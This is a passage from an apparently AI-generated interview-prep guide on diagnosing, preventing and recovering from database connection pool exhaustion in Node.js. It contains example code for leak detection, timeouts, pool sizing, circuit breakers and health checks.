    logger.error('Connection leaks detected', {
      count: leaks.length,
      leaks: leaks.map(l => ({
        age: l.age,
        stack: l.stack.split('\n').slice(0, 5).join('\n')
      }))
    });
  }
}, 60000);
```

**3. Query timeout tracking**
```javascript
// Track long-running queries
pool.on('acquire', (client) => {
  client._acquiredAt = Date.now();
});

pool.on('release', (err, client) => {
  if (client._acquiredAt) {
    const duration = Date.now() - client._acquiredAt;
    
    if (duration > 5000) {  // Held > 5 seconds
      logger.warn('Long connection hold time', { duration });
    }
    
    delete client._acquiredAt;
  }
});
```

**Prevention Strategies:**

**1. Always use try/finally**
```javascript
async function withConnection(callback) {
  const client = await pool.connect();
  try {
    return await callback(client);
  } finally {
    client.release();
  }
}

// Usage
const user = await withConnection(async (client) => {
  const result = await client.query('SELECT * FROM users WHERE id = $1', [123]);
  return result.rows[0];
});
```

**2. Connection timeout**
```javascript
const pool = new Pool({
  connectionTimeoutMillis: 2000,  // Wait max 2s for connection
});

// Prevents requests from waiting forever
```

**3. Statement timeout**
```javascript
// Set query timeout
await client.query('SET statement_timeout = 5000');  // 5 seconds

// Or per query
await client.query({
  text: 'SELECT * FROM users',
  timeout: 5000
});

// Prevents long-running queries from holding connections
```

**4. Proper pool sizing**
```javascript
// Formula: connections = ((core_count × 2) + effective_spindle_count)
// 4 cores + 1 SSD = 9 connections

// But consider:
// - Traffic patterns (spikes)
// - Query complexity (long queries need fewer concurrent)
// - Database limits (max_connections)

const pool = new Pool({
  min: 5,   // Keep warm
  max: 20,  // Allow burst
  
  idleTimeoutMillis: 30000,  // Close idle after 30s
  connectionTimeoutMillis: 2000  // Fail fast
});
```

**5. Circuit breaker for database**
```javascript
const dbCircuitBreaker = new CircuitBreaker(queryDatabase, {
  timeout: 10000,
  errorThresholdPercentage: 50,
  resetTimeout: 30000
});

async function queryDatabase(query, params) {
  return pool.query(query, params);
}

// Prevents overwhelming database during issues
const result = await dbCircuitBreaker.fire('SELECT * FROM users', []);
```

**6. Health check endpoint**
```javascript
app.get('/health/database', async (req, res) => {
  const health = {
    pool: {
      total: pool.totalCount,
      idle: pool.idleCount,
      waiting: pool.waitingCount,
      utilization: `${((pool.totalCount - pool.idleCount) / pool.options.max * 100).toFixed(1)}%`
    },
    connectivity: null
  };
  
  try {
    // Test query
    const start = Date.now();
    await pool.query('SELECT 1');
    health.connectivity = {
      status: 'ok',
      latency: Date.now() - start
    };
    
    res.json(health);
  } catch (error) {
    health.connectivity = {
      status: 'error',
      error: error.message
    };
    
    res.status(503).json(health);
  }
});
```

**Recovery:**

**1. Graceful degradation**
```javascript
async function getUser(id) {
  try {
    return await pool.query('SELECT * FROM users WHERE id = $1', [id]);
  } catch (error) {
    if (error.message.includes('timeout')) {
      // Pool exhausted, return cached data
      logger.warn('Database pool exhausted, using cache');
      return getCachedUser(id);
    }
    throw error;
  }
}
```

**2. Emergency pool drain**
```javascript
// Force release all connections
async function drainPool() {
  logger.warn('Draining connection pool');
  
  await pool.end();
  
  // Recreate pool
  pool = new Pool(config);
  
  logger.info('Pool recreated');
}

// Use as last resort
```

**Interview tip:** Explain root causes (leaks, long queries, spikes), show monitoring techniques (pool stats, leak detection, query timeouts), discuss prevention (try/finally, timeouts, proper sizing), and mention graceful degradation when pool exhausted."

---

**Progress: 42/100 questions complete**

Continue with remaining 4 Database/Performance questions (Q39-Q42)?